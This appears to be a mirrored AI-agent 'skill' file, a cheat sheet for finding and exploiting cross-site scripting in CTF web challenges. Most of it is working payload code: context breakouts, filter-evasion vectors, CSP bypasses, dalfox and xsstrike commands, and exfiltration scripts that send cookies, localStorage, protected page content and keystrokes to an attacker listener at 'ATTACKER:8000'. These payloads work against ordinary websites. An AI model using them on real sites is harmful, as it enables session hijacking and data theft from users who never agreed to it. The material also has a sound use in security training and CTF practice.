# Cross-Site Scripting (XSS)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/xss.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/xss.md)

---

---
name: xss
category: web
triggers: [xss, "cross-site scripting", reflected, stored, "dom xss", "innerHTML", "document.write", "location.hash", csp, "content-security-policy", "alert(1)", "cookie theft", "javascript:", onerror, "search=", comment]
tools: [burp, xsstrike, dalfox, curl]
priority: medium
description: Find and weaponize reflected/stored/DOM XSS — context-aware payloads, CSP bypass, cookie/session exfiltration.
---
# Cross-Site Scripting (XSS)

## Trigger context
- Input reflected into HTML/JS/attribute/URL: `search=`, `q=`, `name=`, error messages, comments, profile fields, `Referer`/`User-Agent` shown in admin panels.
- DOM sinks in client JS: `innerHTML`, `document.write`, `eval`, `setTimeout`, `location`, `$().html()`, sourced from `location.hash`/`location.search`/`document.referrer`.
- CTF signals: a "report to admin/bot" feature (=> steal admin cookie/flag), a rendered comment field, a URL param echoed verbatim.

## Objective
Prove script execution in the right context, then use it to exfiltrate the flag — usually the admin bot's cookie, localStorage, or a protected page's content.

## Methodology (decision tree)
1. Inject a unique marker (`xss1234`); find WHERE and in what CONTEXT it reflects (HTML body, attribute, `<script>`, URL, comment).
2. Probe for filtered characters: `< > " ' / ( ) { } ;` and event handlers. Determine what survives.
3. Craft a context-appropriate breakout payload (close the current tag/attribute/string first).
4. Reflected vs Stored vs DOM:
   - Reflected: payload in the URL/param, fire via crafted link to the victim/bot.
   - Stored: payload persists (comment/profile); admin viewing it executes it.
   - DOM: no server involvement; trace source->sink in JS, deliver via `#`/query.
5. If a CSP is present, read it and pick a bypass (allowed host, `unsafe-inline`, JSONP, dangling markup).
6. Weaponize: exfiltrate cookie / localStorage / page HTML to your listener.

## Commands & payloads
```html
<!-- 1-3. Context-specific breakouts -->
<!-- HTML body -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<!-- inside an attribute value  ...value="MARKER" -->
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
<!-- inside <script> var a='MARKER'; -->
';alert(1)//
</script><svg onload=alert(1)>
<!-- inside href/src -->
javascript:alert(1)
<!-- filter-evasion vectors -->
<img src=x onerror="alert`1`">                 <!-- no parens -->
<svg/onload=alert(1)>                           <!-- no spaces -->
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<a href=" javascript:alert(1)">x</a>            <!-- leading space bypass -->
```
```javascript
// 4c. Common DOM sinks — trace and trigger
// source: location.hash / location.search / document.referrer / postMessage
element.innerHTML = location.hash.slice(1);      // deliver: page#<img src=x onerror=alert(1)>
document.write(location.search);
eval(location.hash.slice(1));
new Function(userInput)(); setTimeout(userInput);
$('#o').html(location.hash);                      // jQuery sink
```
```html
<!-- 6. Exfiltration (start:  python3 -m http.server 8000 / nc -lvnp 8000) -->
<script>new Image().src='http://ATTACKER:8000/c?'+encodeURIComponent(document.cookie)</script>
<script>fetch('http://ATTACKER:8000/?'+btoa(document.cookie))</script>
<svg onload="fetch('http://ATTACKER:8000/?c='+document.cookie)">
<!-- steal localStorage / a protected page (SOP-permitting) -->
<script>fetch('/admin/flag').then(r=>r.text()).then(t=>fetch('http://ATTACKER:8000/?'+btoa(t)))</script>
<!-- keylogger / form capture -->
<script>onkeypress=e=>fetch('http://ATTACKER:8000/?k='+e.key)</script>
```
```
# 5. CSP bypass by policy weakness (read header first: curl -sI ... | grep -i content-security)
unsafe-inline present        -> inline <script>/handlers just work
whitelisted CDN w/ JSONP     -> <script src="//trusted.com/jsonp?cb=alert(1)//"></script>
allows 'self' + file upload  -> host your JS on the same origin, <script src=/uploads/x.js>
allows *.google.com etc.     -> AngularJS/known-gadget on allowed host
no base-uri + <base> allowed -> <base href="//attacker"> hijacks relative script src
strict-dynamic + injectable script tag -> nonce reuse / gadget
# dangling markup (no JS exec, still steals data)
<img src='http://ATTACKER/?
```
```bash
# Automated discovery
dalfox url "http://TARGET/page?q=1" --custom-payload payloads.txt
dalfox url "http://TARGET/page?q=1" -b YOUR.oob.host      # blind XSS callback
python3 xsstrike.py -u "http://TARGET/page?q=1" --fuzzer
# fire a stored/reflected payload at the CTF "report to admin" bot, then watch your listener
```

## Branching logic
- Reflects raw, no filtering -> straight `<script>`/`onerror`; done.
- Filtered but a tag/event survives -> pick the surviving vector from the cheat sheet.
- Input inside `<script>` string -> break the JS string/comment, no HTML tags needed.
- No server reflection but client JS handles input -> DOM XSS; deliver via `#`/query and confirm in a real browser.
- CSP blocks inline -> match a bypass to the exact policy; if none, use dangling-markup data exfil.
- "Report to admin/bot" present -> this is the win condition: steal cookie or fetch the flag page -> exfil.
- HTML-encoded output everywhere -> likely not XSS here; re-check other params or [ssti](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssti.md).

## Common pitfalls
- Testing `alert(1)` and stopping — CTFs need exfiltration, not a popup. Chase the admin cookie/flag.
- Ignoring context: an HTML-body payload won't fire inside an attribute or `<script>` string. Break out correctly.
- `HttpOnly` cookies can't be read via `document.cookie` -> pivot to CSRF/action-on-behalf or fetch a protected page instead.
- DOM XSS not reproducible via curl (server never sees it); verify in a headless/real browser.
- Forgetting to URL-encode the payload in the delivered link -> browser mangles it.
- Modern browsers block many `javascript:` and mixed-content requests; use same-scheme exfil hosts.

## Proof / verification
- Execution proof: `alert(document.domain)` in the target origin, or a callback hit on your server/OOB host.
- Flag capture: your listener logs receive the admin cookie/localStorage/page HTML; decode (`base64 -d`) and read the flag; or the exfil'd `/admin` page contains `FLAG{...}`.
- Blind XSS: dalfox/XSSHunter callback fires from the admin's browser.

## Cross-references
[web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md) · [ssti](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssti.md) · [sql-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--sql-injection.md)

## Credible sources
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
